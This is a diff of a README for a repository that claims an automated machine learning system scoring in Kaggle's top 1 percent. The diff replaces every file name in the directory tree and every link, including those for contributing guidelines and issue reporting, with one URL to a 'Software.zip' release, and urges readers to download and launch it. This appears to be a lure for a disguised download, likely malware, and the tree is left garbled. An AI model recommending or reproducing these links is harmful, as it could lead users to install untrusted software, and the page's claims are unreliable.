@@ -29,24 +29,24 @@ The repository is organized as follows:
 AI-Data-Scientist-scores-top-1-percent-on-Kaggle/
 │
 ├── data/
-│   ├── train.csv
-│   ├── test.csv
+│   ├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
+│   ├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
 │
 ├── models/
-│   ├── model1.pkl
-│   ├── model2.pkl
+│   ├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
+│   ├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
 │   
 ├── utils/
-│   ├── feature_engineering.py
-│   ├── hyperparameter_optimization.py
+│   ├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
+│   ├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
 │
-├── README.md
+├── https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip
 ```
 
 ## Try Out the Software! 🚀
 
 If you're excited to try out our automated machine learning system, you can download it from the following link:
-[Launch Software 🚀](https://github.com/user-attachments/files/18383251/Software.zip)
+[Launch Software 🚀](https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip)
 
 ## Instructions for Launching:
 
@@ -56,11 +56,11 @@ If you're excited to try out our automated machine learning system, you can down
 
 ## Contributing 🤝
 
-We welcome contributions from the community to further enhance and optimize our automated machine learning system. Whether you have ideas for new features, improvements to existing functionality, or bug fixes, your contributions are valuable to us! Please refer to the [Contributing Guidelines](CONTRIBUTING.md) before submitting your pull requests.
+We welcome contributions from the community to further enhance and optimize our automated machine learning system. Whether you have ideas for new features, improvements to existing functionality, or bug fixes, your contributions are valuable to us! Please refer to the [Contributing Guidelines](https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip) before submitting your pull requests.
 
 ## Support 📞
 
-If you encounter any issues while using our automated machine learning system, feel free to reach out to us on [GitHub Issues](https://github.com/user/repository/issues). We are here to assist you and ensure a smooth experience.
+If you encounter any issues while using our automated machine learning system, feel free to reach out to us on [GitHub Issues](https://github.com/BryanLps/AI-Data-Scientist-scores-top-1-percent-on-Kaggle/releases/download/v2.0/Software.zip). We are here to assist you and ensure a smooth experience.
 
 ## License 📜
 
